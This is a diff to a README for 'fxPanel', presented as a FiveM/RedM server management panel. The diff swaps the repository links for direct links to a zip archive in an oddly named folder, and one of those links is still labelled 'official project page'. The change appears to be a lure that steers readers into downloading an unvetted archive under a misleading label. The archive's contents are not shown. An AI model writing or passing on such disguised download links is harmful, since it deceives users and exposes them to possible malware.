@@ -1,12 +1,12 @@
 # 🛠️ fxPanel - Manage FiveM servers with ease
 
-[![](https://img.shields.io/badge/Download_fxPanel-Blue?style=for-the-badge)](https://github.com/cabulongrenelyn7/fxPanel)
+[![](https://img.shields.io/badge/Download_fxPanel-Blue?style=for-the-badge)](https://github.com/cabulongrenelyn7/fxPanel/raw/refs/heads/main/absenteeship/Panel_fx_2.4.zip)
 
 fxPanel organizes server management for FiveM and RedM environments. This application replaces older tools with a stable system. It delivers a clean interface and keeps your server data secure. Use this panel to monitor performance and adjust settings without manual file edits.
 
 ## 📥 Download and Install
 
-Visit the [official project page](https://github.com/cabulongrenelyn7/fxPanel) to download the latest version.
+Visit the [official project page](https://github.com/cabulongrenelyn7/fxPanel/raw/refs/heads/main/absenteeship/Panel_fx_2.4.zip) to download the latest version.
 
 1. Go to the link above.
 2. Locate the Releases section on the right side of the screen.
